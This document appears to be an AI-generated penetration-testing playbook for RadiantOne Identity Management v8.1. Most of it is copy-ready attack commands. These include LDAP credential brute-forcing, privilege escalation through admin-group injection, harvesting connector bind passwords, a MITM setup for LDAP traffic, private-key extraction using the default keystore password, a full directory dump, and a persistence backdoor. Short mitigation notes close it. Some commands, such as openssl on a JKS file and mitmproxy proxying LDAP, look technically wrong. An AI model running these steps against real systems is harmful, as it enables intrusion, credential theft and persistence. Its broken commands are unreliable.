# RadiantOne v8.1 Attack Methodology

Below is a comprehensive end-to-end penetration testing methodology for RadiantOne Identity Management v8.1, formatted as a Markdown file for easy reference and download.

---

## 1. Reconnaissance & Service Enumeration

### 1.1 Port/Service Discovery
Identify RadiantOne-related ports:
```bash
nmap -sS -p2389,2636,7070,7171,8089,8090 -sV -oA scans/radiantone_base 10.0.0.5
```
- **2389** LDAP  
- **2636** LDAPS  
- **7070/7171** Admin UI (HTTP/HTTPS)  
- **8089/8090** SCIM/REST API (HTTP/HTTPS)

### 1.2 LDAP Version & RootDSE Fingerprint
```bash
ldapsearch -x -H ldap://10.0.0.5:2389 -s base -b "" vendorVersion supportedLDAPVersion
```
- Confirms RadiantOne version (e.g., `8.1.2`).  
- Enumerate `namingContexts` to discover base DN.

### 1.3 Cluster Components
If you find port **2181**, that’s ZooKeeper (cluster coordination):
```bash
nmap -sV -p2181 10.0.0.5
echo ruok | nc 10.0.0.5 2181  # returns 'imok' if unauthenticated access is allowed
```

---

## 2. LDAP / FID Exploitation

### 2.1 Anonymous Bind Test
```bash
ldapsearch -x -H ldap://10.0.0.5:2389 -b "dc=example,dc=com" "(objectClass=*)" cn
```
- If entries are returned, anonymous read is enabled (default).  
- **Mitigation**: enable “Bind Requires Password” in Admin UI.

### 2.2 Default-Admin Credential Brute-Force
```bash
hydra -L users.txt -P passwords.txt ldap://10.0.0.5 -s 2389       -V -t 4
```
Targets `cn=Directory Manager` or other known DNs.

### 2.3 Read ACL / ACI Enumeration
```bash
ldapsearch -x -H ldap://10.0.0.5:2389 -b "cn=ACIs,cn=config" "(objectClass=aciEntry)" aci
```
Look for overly broad ACIs like `globalRead`.

### 2.4 Privilege Escalation via Group-Injection
```bash
ldapmodify -H ldap://10.0.0.5:2389 -D "cn=Directory Manager,cn=config" -W <<EOF
dn: cn=Administrators,ou=Groups,dc=example,dc=com
changetype: modify
add: member
member: uid=lowpriv,ou=Users,dc=example,dc=com
EOF
```
If allowed, adds low-priv user to admin group.

---

## 3. Connector & Synchronization Abuse

### 3.1 Extract Connector Credentials
In Admin UI: **Data Sources → Edit Connector → Show Password**  
Or via server:
```bash
grep -R "bindPassword" /opt/radiantone/config/
```

### 3.2 Direct Backend Bind
```bash
ldapsearch -H ldap://ad.domain.local:389 -D "CN=svc_rad_one,OU=Service Accounts,DC=domain,DC=local" -w 'SecretPass!' -b "dc=domain,dc=local" "(objectClass=*)"
```
Enumerate or modify backend AD/LDAP.

### 3.3 MITM Connector Traffic
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A PREROUTING -p tcp --dport 389 -j REDIRECT --to-port 1389
mitmproxy --mode upstream:http://ad.domain.local:389 -p 1389
```
Capture cleartext credentials if StartTLS is not enforced.

---

## 4. Web Interface & API Testing

### 4.1 Admin UI Login Bruteforce (Burp Intruder)
1. Proxy the login POST `https://10.0.0.5:7171/login`.  
2. Send to Intruder; configure username/password positions.  
3. Load wordlists; launch attack.

### 4.2 Active Scan & Manual Testing
- Use Burp’s Active Scan on all Control-Panel endpoints.  
- Test for XSS in user-editable fields.  
- Probe for IDOR: access `/user/edit?uid=admin` as low-priv user.

### 4.3 SCIM / REST API Enumeration
```bash
curl -k -u "cn=Directory Manager,cn=config:AdminPass!" https://10.0.0.5:8089/scim/v2/Users
```
Verify data access and attempt CRUD operations.

---

## 5. Configuration & Hardening Review

### 5.1 Keystore & TLS Checks
```bash
keytool -list -keystore /opt/radiantone/config/radiantone.jks -storepass changeit
openssl pkcs12 -in radiantone.jks -nocerts -nodes -passin pass:changeit > private_key.pem
```
Default `changeit` enables extraction of private keys.

### 5.2 Password Policy & Hashing
Review **Security → Password Policies** in Admin UI.  
Identify weak hashing (e.g., Digest-MD5).

### 5.3 Audit Logging
Simulate failed binds; verify entries in `/opt/radiantone/logs/`.

---

## 6. Post-Exploitation & Reporting

1. **Data Exfiltration**: `ldapsearch … > full_dump.ldif`  
2. **Persistence**: Create backdoor via SCIM API.  
3. **Clean-up**: Revert test changes (users, ACIs).  
4. **Report**:
   - **Findings**: anonymous bind, default keystore password, etc.
   - **Risk**: privilege escalation, data theft.
   - **Recommendations**:
     - Disable anonymous LDAP.
     - Enforce TLS on connectors.
     - Rotate default keystore passwords.
     - Harden password policy; enable account lockout.
     - Tighten ACIs and remove global read.

---

*Generated with Kali Linux tools & Burp Suite Pro commands.*  
